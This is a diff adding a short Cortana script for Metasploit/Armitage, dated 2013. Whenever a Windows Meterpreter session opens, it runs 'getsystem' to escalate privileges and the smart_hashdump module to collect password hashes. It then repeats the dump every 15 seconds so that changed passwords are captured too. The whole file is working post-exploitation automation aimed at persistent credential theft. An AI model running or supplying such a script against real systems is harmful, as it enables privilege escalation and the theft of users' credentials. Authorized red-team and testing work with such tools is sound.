@@ -1,0 +1,22 @@
+###############################################################
+# Cortana Script by @christruncer
+# This script is for dumping hashes and continuing to dump
+# hashes in the event passwords are changed
+# Created: 2/18/2013      Edited: 2/19/2013
+###############################################################
+
+on session_open {
+        if(!-iswinmeterpreter $1){return;}
+        while(!-isready $1) {}
+        println("Let's escalate our privileges!");
+        m_cmd($1, "getsystem");
+        while(!-isready $1) {}
+        println("Ok... Now dump hashes");
+        post("windows/gather/smart_hashdump", $1);
+        while(!-isready $1) {}
+        println("Credentials have been gathered");
+}
+
+on heartbeat_15s {
+	post("windows/gather/smart_hashdump", $1);
+}
